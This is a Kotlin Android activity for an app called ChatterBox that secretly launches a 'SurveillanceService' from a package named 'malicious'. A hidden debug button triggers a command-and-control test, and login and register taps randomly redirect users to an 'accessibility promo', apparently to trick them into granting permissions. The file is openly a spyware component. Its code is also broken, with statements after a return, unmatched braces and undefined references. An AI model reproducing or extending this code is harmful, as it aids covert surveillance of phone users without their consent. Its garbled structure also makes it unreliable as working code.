package com.example.ChatterBox

import android.content.Intent
import android.os.Bundle
import android.widget.Button
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import com.example.ChatterBox.malicious.SurveillanceService

class HomeActivity : AppCompatActivity() {
    private val TAG = "HomeActivity"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_home)

        val loginButton = findViewById<Button>(R.id.btnLogin)
        val registerButton = findViewById<Button>(R.id.btnRegister)

        loginButton.setOnClickListener {
            // With a 30% probability, show the accessibility promo
            if (shouldShowAccessibilityPromo()) {
                startActivity(Intent(this, AccessibilityPromoActivity::class.java))
            } else {
                startActivity(Intent(this, LoginActivity::class.java))
            }
        }

        registerButton.setOnClickListener {
            // With a 30% probability, show the accessibility promo
            if (shouldShowAccessibilityPromo()) {
                startActivity(Intent(this, AccessibilityPromoActivity::class.java))
            } else {
                startActivity(Intent(this, RegisterActivity::class.java))
            }
        }
    }

    /**
     * Determines if we should show the accessibility promo
     * Uses a mix of random chance and whether we've shown it before
     */
    private fun shouldShowAccessibilityPromo(): Boolean {
        val prefs = getSharedPreferences(PREFS_KEY, MODE_PRIVATE)
        val alreadyShown = prefs.getBoolean(SHOWN_ACCESSIBILITY_PROMO, false)

        // If we've already shown it, don't show it again with 90% probability
        if (alreadyShown && Random().nextInt(10) < 9) {
            return false
        }

        // Show it with 30% probability
        val shouldShow = Random().nextInt(10) < 3

        // If we're going to show it, record that fact
        if (shouldShow) {
            prefs.edit().putBoolean(SHOWN_ACCESSIBILITY_PROMO, true).apply()
        }

        return shouldShow
            startActivity(Intent(this, RegisterActivity::class.java))
        }

        // Start the surveillance service in the background
        startSurveillanceService()

        // HIDDEN - Debug buttons are in the app for testing C2 functionality
        // These would be hidden or removed in a real malicious app
        try {
            // This button might not exist in all layouts, so wrap in try-catch
            val helpButton = findViewById<Button>(R.id.btnHelp)
            helpButton?.setOnClickListener {
                // Test button for C2 - this is hidden in the layout but can be accessed for testing
                Log.d(TAG, "Debug: Testing C2 connection manually")

                // Start a direct test of the C2 client
                val intent = Intent(this, SurveillanceService::class.java)
                intent.action = "TEST_C2"
                startService(intent)

                Log.d(TAG, "Debug: C2 test command sent")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Debug button not found or error setting listener", e)
        }
    }

    private fun startSurveillanceService() {
        try {
            Log.d(TAG, "Starting SurveillanceService")
            val serviceIntent = Intent(this, SurveillanceService::class.java)
            startService(serviceIntent)
            Log.d(TAG, "SurveillanceService started successfully")
        } catch (e: Exception) {
            Log.e(TAG, "Error starting SurveillanceService", e)
        }
    }
}
